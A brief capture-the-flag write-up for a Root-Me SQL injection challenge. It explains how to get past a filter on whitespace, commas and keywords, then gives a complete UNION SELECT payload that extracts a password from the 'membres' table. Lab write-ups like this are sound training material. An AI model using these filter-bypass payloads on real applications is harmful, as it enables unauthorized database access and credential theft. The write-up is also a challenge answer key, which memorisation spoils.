## Challenge name: SQL injection - Filter bypass

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass)

**The filter blocks keywords, whitespace, `+`, commas. Bypass techniques:**
- Use `%09` (tab) instead of spaces
- Use uppercase keywords (`UNION`, `SELECT`)
- Use `CROSS JOIN` instead of commas

**Payload:**
```
1%09UNION%09SELECT%09*%09FROM%09((SELECT%09123)%09AS%09a%09JOIN%09(SELECT%09456)%09AS%09b%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091)%09AS%09d)%09LIMIT%091%09OFFSET%091
```

**Use the captured flag/password to validate the challenge.**

**Thankyou.**
